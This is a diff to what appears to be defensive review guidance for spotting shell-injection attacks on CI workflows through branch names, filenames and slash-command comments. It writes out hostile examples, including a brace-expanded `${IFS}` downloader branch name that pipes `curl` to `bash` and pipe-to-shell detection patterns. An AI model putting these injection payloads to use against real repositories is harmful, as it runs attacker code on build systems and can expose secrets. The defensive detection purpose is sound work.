@@ -20,6 +20,18 @@ $(echo${IFS}<base64>|base64${IFS}-d|bash)
 When a workflow interpolates such a filename into a shell context, the substitution runs. Treat any
 `${IFS}` in a change as a **high** signal, and decode the surrounding base64 to see the real command.
 
+## Other channels the author controls
+The diff is not the only text a workflow interpolates. Two more carried the hackerbot-claw campaign:
+- **The head branch name** (the `### BRANCH` section). Git allows `$(...)`, backticks and `{a,b}` brace
+  lists in a ref name, and a workflow that expands `github.head_ref` into a shell runs them. The
+  space-free spelling `dev$({curl,-sSfL,host/x}${IFS}|${IFS}bash)` is a downloader; a base64 branch name
+  decodes to one. A branch a human named seldom looks like this, though a maintainer can (`fix/handle_${HOME}_expansion`): weigh who pushed it. A fork or an outsider carrying one is the attack shape; an owner, member or collaborator carrying one is odd but can already push.
+- **Comments** (the `### COMMENT` sections). `issue_comment` workflows dispatch on slash commands such as
+  `/format` or `/version minor`. A command typed by the change's own author within an hour of opening it,
+  or by an outsider, is the trigger shape; judge it together with what the workflow would then run. A comment
+  is the WRITER's evidence: a payload in a drive-by's comment says something about the drive-by, not about the
+  author of the PR it was posted on.
+
 ## Command substitution and pipe-to-shell
 - `$(...)` / backticks — run a subcommand; combined with `${IFS}` and base64 it hides a downloader.
 - `curl … | bash`, `wget … | sh` — download-and-execute; a **critical** signal. The remote script is
